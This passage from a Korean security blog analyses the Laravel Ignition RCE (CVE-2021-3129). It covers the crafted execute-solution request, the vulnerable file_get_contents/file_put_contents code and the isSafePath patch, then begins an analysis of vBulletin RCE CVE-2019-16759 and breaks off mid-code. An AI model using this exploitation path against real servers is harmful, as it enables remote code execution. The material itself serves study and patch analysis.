application&#x2F;json</span><br><span class="line">Content-Length: 320</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">&quot;solution&quot;: &quot;Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution&quot;,</span><br><span class="line">&quot;parameters&quot;:&#123;</span><br><span class="line">&quot;variableName&quot;: &quot;username&quot;,</span><br><span class="line">&quot;viewFile&quot;: &quot;&#x2F;work&#x2F;pentest&#x2F;laravel&#x2F;laravel&#x2F;resources&#x2F;views&#x2F;hello.blade.php&quot;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위 요청은 username이라는 변수로 템플릿을 생성해주는 로직의 요청 헤더 값이고, solution의 값은 <code>Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution</code>, viewFile의 값은 <code>/work/pentest/laravel/laravel/resources/views/hello.blade.php</code>인 것을 볼 수 있습니다. 하지만 solution, viewFile의 값은 임의의 값으로 수정이 가능합니다.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Http</span>\<span class="title">Controllers</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Http</span>\<span class="title">Requests</span>\<span class="title">ExecuteSolutionRequest</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">IgnitionContracts</span>\<span class="title">SolutionProviderRepository</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Foundation</span>\<span class="title">Validation</span>\<span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ExecuteSolutionController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">use</span> <span class="title">ValidatesRequests</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        ExecuteSolutionRequest <span class="variable">$request</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">        SolutionProviderRepository <span class="variable">$solutionProviderRepository</span></span></span></span><br><span class="line"><span class="function"><span class="params">    </span>) </span>&#123;</span><br><span class="line">        <span class="variable">$solution</span> = <span class="variable">$request</span>-&gt;getRunnableSolution();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$solution</span>-&gt;run(<span class="variable">$request</span>-&gt;get(<span class="string">&#x27;parameters&#x27;</span>, []));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> response(<span class="string">&#x27;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>컨트롤러를 확인해봅시다. <code>ExecuteSolutionController</code> 클래스를 확인해 보면 run() 메서드를 실행하고, 인자 값으로는 parameters를 넘겨주는 것을 볼 수 있습니다. run() 메서드는 <code>MakeViewVariableOptionalSolution::run()</code>에 정의되어 있습니다.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Facade</span>\<span class="title">Ignition</span>\<span class="title">Solutions</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Facade</span>\<span class="title">IgnitionContracts</span>\<span class="title">RunnableSolution</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Support</span>\<span class="title">Facades</span>\<span class="title">Blade</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MakeViewVariableOptionalSolution</span> <span class="keyword">implements</span> <span class="title">RunnableSolution</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">        <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">generateExpectedTokens</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$originalTokens</span>, <span class="keyword">string</span> <span class="variable">$variableName</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$expectedTokens</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$originalTokens</span> <span class="keyword">as</span> <span class="variable">$token</span>) &#123;</span><br><span class="line">            <span class="variable">$expectedTokens</span>[] = <span class="variable">$token</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$token</span>[<span class="number">0</span>] === T_VARIABLE &amp;&amp; <span class="variable">$token</span>[<span class="number">1</span>] === <span class="string">&#x27;$&#x27;</span>.<span class="variable">$variableName</span>) &#123;</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_COALESCE, <span class="string">&#x27;??&#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_CONSTANT_ENCAPSED_STRING, <span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$expectedTokens</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>위 요청 헤더에서 sollution이 가르키는 <code>MakeViewVariableOptionalSolution</code> 클래스를 보면 run() 메서드에서 makeOptional() 메서드를 호출하는 것을 볼 수 있고, makeOptional() 메서드에 값으로 $parameters를 그대로 넘겨주고 있는 것을 볼 수 있습니다. (Facade\Ignition\Solutions\MakeViewVariableOptionalSolution)<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">    <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">    <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>makeOptional() 메서드를 보면 file_get_contents() 메서드를 호출하는 데 이때 입력값인 <code>viewFile</code>(임의의 값을 넣어줄 수 있음)를 넘겨주고 있는 것을 볼 수 있습니다. 그리고 <code>$originalContents</code>에서 <code>&#39;$&#39;.$parameters[&#39;variableName&#39;]</code>을 <code>&#39;$&#39;.$parameters[&#39;variableName&#39;].&quot; ?? &#39;&#39;&quot;</code>로 replace 시키고, 2개의 값을 이용해서 토큰 2개를 생성하는 것을 볼 수 있습니다. 그리고 생성된 두개의 토큰이 다르 false를 반환하고, 같은 $newContents를 반환하는 것을 볼 수 있습니다.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">        file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>$newContents가 리턴이 되었다면 $newContents의 값을 file_put_contents() 메서드를 이용해서 $parameters[‘viewFile’]로 값을 넣어 파일을 생성하고 . 감이 오셨나요? 여기서 file_get_contents(), file_put_contents() 메서드의 인자값에 대한 검증이 존재하지 않아 우리가 원하는 값을 마음대로 삽입할 수 있습니다.<br><br></p><p>연구원은 이를 이용해서 PHP Wrapper을 이용해 log 파일을 체이닝 시켜, 마지막에 phar Wrapper를 이용해서 역직렬화 RCE를 트리거 하였습니다. log 파일을 체이닝 할 때는 base64, utf-8, utf-16 등을 이용해서 체이닝을 해준 것으로 보입니다.<br></p><hr><h2 id="CVE-2021-3129-Patch"><a href="#CVE-2021-3129-Patch" class="headerlink" title="CVE-2021-3129 Patch"></a><em>CVE-2021-3129 Patch</em></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// /ignition-2.5.2/ignition-2.5.2/src/Solutions/MakeViewVariableOptionalSolution.php</span></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$output</span> = <span class="keyword">$this</span>-&gt;makeOptional(<span class="variable">$parameters</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$output</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">            file_put_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>], <span class="variable">$output</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isSafePath</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$path</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! Str::startsWith(<span class="variable">$path</span>, [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;./&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (! Str::endsWith(<span class="variable">$path</span>, <span class="string">&#x27;.blade.php&#x27;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">makeOptional</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$parameters</span> = []</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (! <span class="keyword">$this</span>-&gt;isSafePath(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalContents</span> = file_get_contents(<span class="variable">$parameters</span>[<span class="string">&#x27;viewFile&#x27;</span>]);</span><br><span class="line">        <span class="variable">$newContents</span> = str_replace(<span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>], <span class="string">&#x27;$&#x27;</span>.<span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>].<span class="string">&quot; ?? &#x27;&#x27;&quot;</span>, <span class="variable">$originalContents</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$originalTokens</span> = token_get_all(Blade::compileString(<span class="variable">$originalContents</span>));</span><br><span class="line">        <span class="variable">$newTokens</span> = token_get_all(Blade::compileString(<span class="variable">$newContents</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$expectedTokens</span> = <span class="keyword">$this</span>-&gt;generateExpectedTokens(<span class="variable">$originalTokens</span>, <span class="variable">$parameters</span>[<span class="string">&#x27;variableName&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$expectedTokens</span> !== <span class="variable">$newTokens</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$newContents</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">generateExpectedTokens</span>(<span class="params"><span class="keyword">array</span> <span class="variable">$originalTokens</span>, <span class="keyword">string</span> <span class="variable">$variableName</span></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$expectedTokens</span> = [];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$originalTokens</span> <span class="keyword">as</span> <span class="variable">$token</span>) &#123;</span><br><span class="line">            <span class="variable">$expectedTokens</span>[] = <span class="variable">$token</span>;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$token</span>[<span class="number">0</span>] === T_VARIABLE &amp;&amp; <span class="variable">$token</span>[<span class="number">1</span>] === <span class="string">&#x27;$&#x27;</span>.<span class="variable">$variableName</span>) &#123;</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_COALESCE, <span class="string">&#x27;??&#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_WHITESPACE, <span class="string">&#x27; &#x27;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">                <span class="variable">$expectedTokens</span>[] = [T_CONSTANT_ENCAPSED_STRING, <span class="string">&quot;&#x27;&#x27;&quot;</span>, <span class="variable">$token</span>[<span class="number">2</span>]];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$expectedTokens</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>CVE-2021-3129 Patch 노트가 따로 존재하지 않아 패치 버전인 Ignition 2.5.2의 코드를 직접 확인해보았습니다. <code>makeOptional()</code> 메서드를 보면 기존에는 존재하지 않던 <code>$parameters[&#39;viewFile&#39;]</code>의 값을 <code>isSafePath()</code> 메서드를 이용해서 검증하고 있는 것을 볼 수 있습니다.<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isSafePath</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$path</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (! Str::startsWith(<span class="variable">$path</span>, [<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;./&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! Str::endsWith(<span class="variable">$path</span>, <span class="string">&#x27;.blade.php&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>isSafePath()</code> 메서드를 보면 ‘/‘, ‘./‘로 시작하지 않거나, 마지막에 .blade.php가 아니면 false를 리턴하는 것을 볼 수 있습니다. 위 2개의 검증 로직이 추가되므로 항상 viewFile의 값이 <code>/work/pentest/laravel/laravel/resources/views/hello.blade.php</code>일 때 정상 작동하게 되었고, 개발자가 의도하지 않은 값이 <code>viewFile</code>로 들어오게 되면 아무 일도 일어나지 않게 되며 CVE-2021-3129 취약점을 패치하였습니다.<br></p><p>매번 느끼지만 PHP에서는 끊임 없이 취약점이 나오고 있네요. 앞으로도 PHP를 사용하고 있는 웹 프레임워크나 여러 프로그램에서 취약점이 더 수두룩 나올 거 같습니다.<br></p><hr>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0-day RCE in vBulletin</title>
      <link href="2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/"/>
      <url>2021/01/20/2021-01-20-0-Day-RCE-in-vBulletin/</url>
      
        <content type="html"><![CDATA[<p><strong>vBulletin에서 발견된 0-day 취약점을 분석해보겠습니다. vBulletin은 외국에서 사용하는 포럼 툴이라고 합니다. 한국 말로 풀어 쓰면 토론형 게시판이라고 볼 수 있겠습니다. 여하튼 이 포럼 툴에서 RCE 취약점이 총 2번 발견 되었습니다. </strong><br><br></p><table><thead><tr><th>CVE ID</th><th>Version</th><th>CVSS</th></tr></thead><tbody><tr><td>CVE-2019-16759</td><td>5.x ~ 5.5.4</td><td>9.8</td></tr><tr><td>CVE-2020-7373</td><td>5.5.4 ~ 5.6.2</td><td>9.8</td></tr></tbody></table><p><br><strong>처음에는 <code>CVE-2019-16759</code>라는 취약점이 나왔었고, 취약한 버전은 5.x부터 5.5.4까지라고 합니다. 해당 취약점은 9월 24일에 처음 POC가 공개되었고, 바로 다음 날인 25일에 패치가 됐다고 합니다.<strong><br></p><p><strong>하지만 완전히 패치된 줄 알았던 0-day 취약점이 한 보안 연구원에 의해서 또 다시 뚫리고 말았습니다. <code>CVE-2020-7373</code>라는 CVE ID로 나왔었고, 취약한 버전은 5.5.4부터 5.6.2까지라고 합니다. 그럼 한 번 RCE가 어떻게 트리거 됐는지 코드 분석을 통해 알아보겠습니다.</strong><br><br></p><hr><h2 id="CVE-2019-16759"><a href="#CVE-2019-16759" class="headerlink" title="CVE-2019-16759"></a><em>CVE-2019-16759</em></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line"><span class="comment">//For a few set routes we can run a streamlined funcction.</span></span><br><span class="line"><span class="keyword">if</span> (vB5_Frontend_ApplicationLight::isQuickRoute())</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$app</span> = vB5_Frontend_ApplicationLight::init(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$app</span>-&gt;execute())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>취약점의 시작은 index.php에서 시작이 됩니다. <code>isQuickRoute()</code>의 값이 참이면 if 문 내부로 들어가는 것을 볼 수 있습니다. isQuickRoute 메서드는 <code>includes/vb5/frontend/applicationlight.php</code> 내부에 정의되어 있습니다.</strong><br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// includes/vb5/frontend/applicationlight.php</span></span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"></span><br><span class="line">  <span class="comment">/** Tells whether this class can process this request</span></span><br><span class="line"><span class="comment">   *</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> boll</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">isQuickRoute</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="built_in">self</span>::<span class="variable">$quickRoutes</span>[<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>]]))</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      <span class="keyword">if</span> (substr(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;routestring&#x27;</span>], <span class="number">0</span>, <span class="number">8</span>) == <span class="string">&#x27;ajax/api&#x27;</span>)</span><br><span class="line">      &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span 